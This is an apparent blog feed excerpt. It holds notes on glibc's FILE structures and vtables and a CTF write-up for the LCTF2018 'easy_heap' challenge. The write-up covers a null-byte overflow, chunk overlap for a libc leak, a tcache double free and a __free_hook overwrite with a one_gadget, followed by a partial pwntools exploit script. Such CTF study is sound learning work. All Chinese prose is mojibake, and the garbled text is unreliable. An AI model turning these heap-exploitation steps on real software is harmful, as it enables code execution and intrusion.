åº“ä¸­ï¼Œæ¯ä¸ªç¨‹åºå¯åŠ¨æ—¶æœ‰ä¸‰ä¸ªæ–‡ä»¶æµæ˜¯è‡ªåŠ¨æ‰“å¼€çš„ï¼šstdinã€stdoutã€stderråœ¨libc.soçš„æ•°æ®æ®µçš„</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_2_1_stderr_</span><br><span class="line">_IO_2_1_stdout_</span><br><span class="line">_IO_2_1_stdin_</span><br></pre></td></tr></table></figure><p>è¿›ç¨‹é‡Œç”¨_IO_FILE._chainæ„æˆä¸€ä¸ªå•å‘é“¾è¡¨,é“¾è¡¨å¤´éƒ¨åœ¨libcå…¨å±€å˜é‡<strong>_IO_list_all</strong>å¤„</p><p>_IO_list_all_stampæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå®ƒæ˜¯ç”¨äºè®°å½•æ‰€æœ‰æ‰“å¼€çš„æµï¼ˆstreamï¼‰çš„æ—¶é—´æˆ³ï¼ˆtimestampï¼‰çš„ã€‚</p><p><code>extern struct _IO_FILE_plus *_IO_list_all;</code></p><p>åˆå§‹æ—¶å•é“¾è¡¨æ˜¯è¿™æ ·çš„</p><p><code>_IO_list_all--&gt;_IO_2_1_stderr_--&gt;_IO_2_1_stdout_--&gt;_IO_2_1_stdin_</code></p><h3 id="IO-FILE-plus"><a href="#IO-FILE-plus" class="headerlink" title="_IO_FILE_plus"></a>_IO_FILE_plus</h3><p><img src="/2023/03/29/IO-FILE/image-20230329194516352.png" alt="image-20230329194516352"></p><p>å¯ä»¥ç”¨<code>p *(struct _IO_FILE_plus *) addr</code>æ¥æ‰“å°</p><p>å¯ä»¥çœ‹å‡ºå®é™…åº”ç”¨ä¸­æˆ‘ä»¬ä½¿ç”¨æ—¶æ˜¯<code> _IO_FILE_plus</code>ç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;<span class="comment">//32 ä½çš„ vtable åç§»ä¸º 0x94ï¼Œ64 ä½åç§»ä¸º 0xd8</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åç§»"><a href="#åç§»" class="headerlink" title="åç§»"></a>åç§»</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x0   _flags</span><br><span class="line">0x8   _IO_read_ptr</span><br><span class="line">0x10  _IO_read_end</span><br><span class="line">0x18  _IO_read_base</span><br><span class="line">0x20  _IO_write_base</span><br><span class="line">0x28  _IO_write_ptr</span><br><span class="line">0x30  _IO_write_end</span><br><span class="line">0x38  _IO_buf_base</span><br><span class="line">0x40  _IO_buf_end</span><br><span class="line">0x48  _IO_save_base</span><br><span class="line">0x50  _IO_backup_base</span><br><span class="line">0x58  _IO_save_end</span><br><span class="line">0x60  _markers</span><br><span class="line">0x68  _chain</span><br><span class="line">0x70  _fileno</span><br><span class="line">0x74  _flags2</span><br><span class="line">0x78  _old_offset</span><br><span class="line">0x80  _cur_column</span><br><span class="line">0x82  _vtable_offset</span><br><span class="line">0x83  _shortbuf</span><br><span class="line">0x88  _lock</span><br><span class="line">0x90  _offset</span><br><span class="line">0x98  _codecvt</span><br><span class="line">0xa0  _wide_data</span><br><span class="line">0xa8  _freeres_list</span><br><span class="line">0xb0  _freeres_buf</span><br><span class="line">0xb8  __pad5</span><br><span class="line">0xc0  _mode    </span><br><span class="line">0xc4  _unused2</span><br><span class="line">0xd8  vtable</span><br></pre></td></tr></table></figure><p><code>IO_jump_t * vtable;</code>è™šè¡¨ï¼Œä¸€ä¸‹å­è”æƒ³åˆ°c++è™šå‡½æ•°åº•å±‚åŸç†</p><p><code>_IO_jump_t</code>ä¸­ä¿å­˜äº†ä¸€äº›å¯ä»¥è·³è½¬çš„å‡½æ•°æŒ‡é’ˆï¼Œæ ‡å‡† IO å‡½æ•°éœ€è¦æ–‡ä»¶æµæŒ‡é’ˆæŒ‡å¼•å»è°ƒç”¨è™šè¡¨å‡½æ•°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2023/03/29/IO-FILE/image-20230329195951585.png" alt="image-20230329195951585" style="zoom:80%;"><p>fpæ˜¯ç”¨fopenæ‰“å¼€çš„ä¸€ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°å®é™…å·²ç»å˜æˆ_IO_FILE_pulsåŠ å…¥é“¾è¡¨ï¼Œè¿™é‡Œçš„stdinã€stdoutã€stderrï¼Œfpçš„vtableæŒ‡å‘_IO_jump_tç±»å‹ç»“æ„ä½“_IO_file_jumps</p><p><img src="/2023/03/29/IO-FILE/image-20230329200421200.png" alt="image-20230329200421200"></p><blockquote><p>printf&#x2F;puts æœ€ç»ˆä¼šè°ƒç”¨<code>_IO_file_xsputn</code></p><p>fclose æœ€ç»ˆä¼šè°ƒç”¨<code>_IO_FILE_FINISH</code></p><p>fwrite æœ€ç»ˆä¼šè°ƒç”¨<code>_IO_file_xsputn</code></p><p>fread æœ€ç»ˆä¼šè°ƒç”¨<code>_IO_file_xsgetn</code></p><p>scanf&#x2F;gets æœ€ç»ˆä¼šè°ƒç”¨<code>_IO_file_xsgetn</code></p></blockquote><p>å…ˆä¸åšæºç åˆ†æï¼Œå…ˆå•æ­¥çœ‹ä¸€ä¸‹printfå‡½æ•°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;hello world&quot;</span>);<span class="comment">//æ¢¦å¼€å§‹çš„åœ°æ–¹ï¼Œå‘œå‘œ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/29/IO-FILE/image-20230330001602270.png" alt="image-20230330001602270"></p><p><strong>_IO_file_xsputn</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329233744967.png" alt="image-20230329233744967"></p><p><strong>_IO_file_overflow</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329233840601.png" alt="image-20230329233840601"></p><p><strong>_IO_doallocbuf</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329233956755.png" alt="image-20230329233956755"></p><p><strong>_IO_file_doallocate</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329234222565.png" alt="image-20230329234222565"></p><p><strong>_IO_file_stat</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329234850989.png" alt="image-20230329234850989"></p><p><strong>__fxstat64</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329235004997.png" alt="image-20230329235004997"></p><p><strong>malloc@plt</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329235217971.png" alt="image-20230329235217971"></p><p><strong>_IO_setb</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329235450171.png" alt="image-20230329235450171"></p><p><strong>_IO_do_write</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329235615761.png" alt="image-20230329235615761"></p><p><strong>_IO_default_xsputn</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329235927623.png" alt="image-20230329235927623"></p><p><strong>_IO_file_overflow</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230330000048279.png" alt="image-20230330000048279"></p><p>ä¸‹é¢ä¼šå¾ªç¯IO_file_overflowï¼Œè¿™ä¸ªè°ƒç”¨å°±æ˜¯ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚å¾€æˆ‘ä»¬mallocçš„å †å—(ç¼“å†²åŒº)é‡Œå†™æˆ‘ä»¬çš„è¾“å‡º</p><p><img src="/2023/03/29/IO-FILE/image-20230330001359527.png" alt="image-20230330001359527"></p><p>æœ€åä¼šè°ƒç”¨æˆ‘ä»¬çš„writeåšç³»ç»Ÿè°ƒç”¨è¾“å‡º</p><p><img src="/2023/03/29/IO-FILE/image-20230330001235259.png" alt="image-20230330001235259"></p><p><strong>WTF</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> IO FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache LCTF2018-PWN-easy_heap</title>
      <link href="/2023/03/28/LCTF2018-PWN-easy-heap/"/>
      <url>/2023/03/28/LCTF2018-PWN-easy-heap/</url>
      
        <content type="html"><![CDATA[<p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1UB8-3Iy-UpGObkW6B9YHCQ">https://pan.baidu.com/s/1UB8-3Iy-UpGObkW6B9YHCQ</a><br>æå–ç ï¼šcc8v</p><p>åä¸ªå †å—ä¸€ç›´åœ¨å˜ä½ç½®ï¼Œæœ‰ç‚¹ç»•å•Š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/heap&gt; checksec easy_heap </span><br><span class="line">[*] &#x27;/mnt/hgfs/Share/ctfwiki/pwn/heap/easy_heap&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h2 id="å¤§è‡´æƒ…å†µ"><a href="#å¤§è‡´æƒ…å†µ" class="headerlink" title="å¤§è‡´æƒ…å†µ"></a>å¤§è‡´æƒ…å†µ</h2><p>æœ€å¤šåä¸ªå †å—</p><p>mallocæ—¶å­˜åœ¨ä¸€ä¸ªnull byte overflowï¼Œç”³è¯·å›ºå®šå¤§å°0xF8å †å—ï¼Œa1[a2] &#x3D; 0;æ­£å¥½å¯ä»¥è¦†ç›–ä¸‹ä¸€ä¸ªå †å—çš„inuseä½ä¸º0</p><p>ç®¡ç†ç»“æ„åœ¨0x202050å¤„</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">    <span class="title">malloc_point</span></span></span><br><span class="line"><span class="class">    <span class="title">size</span></span></span><br></pre></td></tr></table></figure><p>æ²¡æœ‰å…¶ä»–æ¼æ´äº†</p><p><strong>å¤§è‡´æ€è·¯æ˜¯ä¿®æ”¹æ‰ä¸€ä¸ªå †å—çš„prevsizeå’Œinuseä½ï¼Œæ”¾å…¥unsortedbinï¼Œåˆ©ç”¨unlinkæ”¾å…¥æŠŠä¸€ä¸ªä¸­é—´çš„éš”å—æ±¡æŸ“æ”¾åˆ°unsortedé“¾é‡Œæ¥åˆ©ç”¨,æ³„éœ²libcçš„åŒæ—¶æ„æˆdouble freeï¼Œå…¶å®æœ¯è¯­åº”è¯¥å«tcache dupï¼Œä½†æ˜¯å“¥ä»¬æ„Ÿè§‰double freeæ›´å½¢è±¡ä¸€ç‚¹</strong></p><h2 id="overlapping-heap-chunkéš”å—æ”»å‡»æ³„éœ²libc"><a href="#overlapping-heap-chunkéš”å—æ”»å‡»æ³„éœ²libc" class="headerlink" title="overlapping heap chunkéš”å—æ”»å‡»æ³„éœ²libc"></a>overlapping heap chunkéš”å—æ”»å‡»æ³„éœ²libc</h2><p>å…ˆç”³è¯·åä¸ªå †å—0-9</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    new(<span class="number">10</span>,<span class="built_in">str</span>(i).encode())</span><br></pre></td></tr></table></figure><p>æŠŠä¸‹é¢åœ°å€å½“æˆæˆ‘ä»¬çš„chunk0-9åŸºåœ°å€</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328232549777.png" alt="image-20230328232549777"></p><p>å†æŠŠ0-5é‡Šæ”¾æ‰ï¼Œ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        delete(i)</span><br></pre></td></tr></table></figure><p>å†é‡Šæ”¾9(é‡Šæ”¾9æ˜¯ä¸ºäº†é˜²æ­¢ç›´æ¥é‡Šæ”¾789ï¼Œä¼šå’Œtopchunkåˆå¹¶ï¼Œ9è¿›å…¥tcachebin inuseä½ä¸ç½®ç©º)</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328224546593.png" alt="image-20230328224546593"></p><p>tacacheæ»¡äº†å†é‡Šæ”¾6 7 8</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">9</span>):</span><br><span class="line">        delete(i)</span><br></pre></td></tr></table></figure><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328224823292.png" alt="image-20230328224823292"></p><p>ä¸ºä»€ä¹ˆåªæœ‰chunk6å‘¢ï¼Ÿ678ç›¸é‚»é‡Šæ”¾å®Œ6å†é‡Šæ”¾7ï¼Œ8å‰é¢çš„å †å—ä¸ºfreeçŠ¶æ€ï¼Œä¼šè§¦å‘unlinke</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328225833809.png" alt="image-20230328225833809"></p><p>åä¸ªchunkéƒ½é‡Šæ”¾æ‰äº†</p><p>å†æŠŠtcache chunkçš„7ä¸ªchunkç”³è¯·å‡ºæ¥ï¼Œæˆ‘ä»¬æ‰å¯ä»¥æ¥è§¦åˆ°unsort binçš„chunkï¼Œ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        new(<span class="number">0x10</span>, <span class="built_in">str</span>(i).encode())</span><br></pre></td></tr></table></figure><p>æŠŠä¸‰ä¸ªéƒ½ç”³è¯·å‡ºæ¥ä½œä¸ºchunk 7 8 9</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328232149288.png" alt="image-20230328232149288"></p><p>è¿™ä¸ªæ—¶å€™chunk8((0x555555757b00))çš„inuseä½ä¸º1ï¼Œpresizeä¸º0x200ï¼Œå¯ä»¥æŠŠä»–å‰é¢çš„chunk7(0x555555757a00)ç”³è¯·å‡ºæ¥ï¼Œå°±å¯ä»¥è¦†ç›–chunk8(0x555555757b00)çš„inuseä½</p><p>éœ€è¦æŠŠå‰é¢8ä¸ªchunkç”³è¯·å‡ºæ¥ï¼Œæ‰å¯ä»¥æ‹¿åˆ°chunk7(0x555555757a00)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">6</span>)</span>:</span><br><span class="line">       <span class="title function_">delete</span><span class="params">(i)</span></span><br></pre></td></tr></table></figure><p>delete(8)</p><p>delete(7)</p><p>è¿™é‡Œå…ˆé‡Šæ”¾8(0x555555757a00)æœ‰å‡ ç‚¹åŸå› </p><ul><li>å¯ä»¥å¡«æ»¡å¡«æ»¡tcacheï¼Œ7(0x555555757900)è¿›å…¥unsortbinï¼Œä¼šæœ‰fdå’ŒbkæŒ‡é’ˆå†™å…¥unsortedbinåœ°å€</li><li>ä¸‹ä¸€æ¬¡ä¼šå…ˆç”³è¯·åˆ°8(0x555555757a00)ï¼Œæ¥è¦†ç›–chunk8(0x555555757b00)çš„inuseä½</li></ul><p><code>new(0xf8,b&#39;null-byte-overflow&#39;)</code></p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328235322081.png" alt="image-20230328235322081"></p><p>ç›®å‰ç”³è¯·åˆ°çš„0ä¸º0x555555757a00ï¼Œ0x555555757b00 previnuseä½ä¸º0ï¼Œä¹Ÿå°±æ˜¯è¯´0è¢«æ±¡æŸ“ä¸ºæœªä½¿ç”¨å®é™…å´æ˜¯ä½¿ç”¨çŠ¶æ€ï¼Œprevsizeæ˜¯0x200å¤§å°ï¼Œ0x555555757900ä¹Ÿæ˜¯freeï¼Œ</p><p>è¿™ä¸ªæ—¶å€™é‡Šæ”¾9(0x555555757b00)ä¼šè§¦å‘unlinke,0x555555757900,0x555555757a00ï¼Œ0x555555757b00åˆå¹¶ä¸ºä¸€ä¸ªå¤§å †å—ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å¼ºåˆ¶æŠŠ0x555555757a00åŠ å…¥unsortedbiné‡Œ</p><p>delete(6)</p><p>delete(9)</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329002903347.png" alt="image-20230329002903347"></p><p>è¿™ä¸ªæ—¶å€™å†æŠŠ0x555555757900ç”³è¯·å‡ºæ¥ï¼Œ0x555555757a00ä¼šæŒ‚ä¸Šé“¾ï¼Œfdå’Œbkä¼šæœ‰binå€¼ï¼Œè¿™æ—¶å€™0x555555757a00è¿˜åœ¨0å¤„ä½¿ç”¨å°±å¯ä»¥showæ³„éœ²unsortedbinäº†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):<span class="comment">#æ‹¿èµ°tcachebiné‡Œçš„</span></span><br><span class="line">    new(<span class="number">0x10</span>,<span class="string">b&#x27;d&#x27;</span>)</span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">&#x27;900&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>é€šè¿‡__malloc_hookå’Œmain_areanå’Œunsortedbinçš„åç§»æ‰¾åˆ°libcåŸºå€</p><h2 id="double-free-amp-amp-free-hook"><a href="#double-free-amp-amp-free-hook" class="headerlink" title="double free &amp;&amp; __free_hook"></a>double free &amp;&amp; __free_hook</h2><p>ç›®å‰stateæ˜¯è¿™æ ·çš„</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329004708034.png" alt="image-20230329004708034"></p><p>å†å»ç”³è¯·ä¸€ä¸ªå †ä¸å°±å¯ä»¥double freeäº†å—</p><p>**ä½ å¯èƒ½ä¼šé—®æˆ‘ä»¬ä¹‹å‰ä¸æ˜¯åœ¨ <a href="https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/">https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/</a> è¯´è¿‡unbutu18è¢«patchæ‰äº†å—ï¼Œæ€ä¹ˆè¿˜èƒ½double free **</p><blockquote><p>æˆ‘ä»¬æ³¨æ„åˆ°åœ¨ç¨‹åºdeleteæ—¶</p><p><code> memset(*(void **)(16LL * index + ar), 0, *(unsigned int *)(16LL * index + ar + 8));</code></p><p>è¿™ä¸€å¥å°±å¸®åŠ©æˆ‘ä»¬ç»•è¿‡double free</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">         tmp;</span><br><span class="line">         tmp = tmp-&gt;next)</span><br><span class="line">        <span class="keyword">if</span> (tmp == e)        </span><br><span class="line">            malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line"><span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æ£€æµ‹doublefreeæ—¶æœ€ç®€å•çš„å°±æ˜¯æ¯ä¸€æ¬¡é‡Šæ”¾éƒ½å»éå†ä¸€ä¸‹å•é“¾è¡¨ï¼Œä½†æ˜¯è¿™æ ·æ•ˆç‡å¤ªä½äº†ï¼Œæ¯•ç«Ÿtcacheçš„å‡ºç°å°±æ˜¯ä¸ºäº†é€Ÿåº¦ï¼Œptmalloc2ä¸ºäº†æ•ˆç‡ï¼Œåœ¨e-&gt;key &#x3D;&#x3D; tcacheæ—¶æ‰ä¼šè¿›è¡Œæ£€æµ‹double freeï¼Œå› ä¸ºåœ¨ä½¿ç”¨çŠ¶æ€çš„chunkï¼Œe-&gt;keyæ˜¯æ•°æ®åŒºï¼ŒåŸºæœ¬ä¸Šæ˜¯ä¸ä¼šæ»¡è¶³-&gt;key &#x3D;&#x3D; tcacheçš„ï¼Œ64ä½ç¨‹åºåªæœ‰2^48-1åˆ†ä¹‹ä¸€çš„æ¦‚ç‡ï¼Œä½¿ç”¨çŠ¶æ€çš„ä¹Ÿæ²¡å¿…è¦æ£€æµ‹double free</p><p>memset(*(void **)(16LL * index + ar), 0, *(unsigned int *)(16LL * index + ar + 8)è¿™ä¸€å¥ä¼šå¸®æˆ‘ä»¬æŠŠåŸæœ¬è¦é‡Šæ”¾çš„keyæŠ¹é™¤æ‰ï¼Œe-&gt;key !&#x3D; tcacheè‡ªç„¶ä¸ä¼šæ£€æµ‹doublefree</p></blockquote><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329005141653.png" alt="image-20230329005141653"></p><p>freeæ‰0å’Œ9</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329014936412.png" alt="image-20230329014936412"></p><p>new(0x10, p64(libc.dump(â€˜__free_hookâ€™)+base))å†™å…¥hookåˆ°å•é“¾è¡¨</p><p>new(0x10, â€˜fuckâ€™)</p><p>æŠŠa10æ‹¿å‡ºæ¥</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329015143119.png" alt="image-20230329015143119"></p><p>ç”±äºåœ¨æ»¡å‘˜ä¸‹é‡Šæ”¾äº†ä¸¤ä¸ªå †ï¼Œåˆç”³è¯·äº†ä¸¤ä¸ªï¼Œæ»¡å‘˜äº†ï¼Œfreeæ‰0å’Œ9ä¹‹å‰éœ€è¦å†é‡Šæ”¾å‡ ä¸ªå †æ‰å¯ä»¥ç”³è¯·ä¸‹ä¸€ä¸ª</p><p>new(0x10, p64(one_gadget))å°±å¯ä»¥ç”³è¯·åˆ°__free_hook-0x10å»ï¼Œhookæ‰äº†__free_hookä¸ºonegadget</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329125937130.png" alt="image-20230329125937130"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./easy_heap&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(content) &gt;= size:</span><br><span class="line">        io.send(content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;index \n&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0xE4B)&#x27;)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    new(<span class="number">10</span>,<span class="built_in">str</span>(i).encode())</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        delete(i)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io) </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">9</span>):</span><br><span class="line">        delete(i)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        new(<span class="number">0x10</span>, <span class="built_in">str</span>(i).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0xE4B)&#x27;)</span></span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;9&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"><span class="comment"># 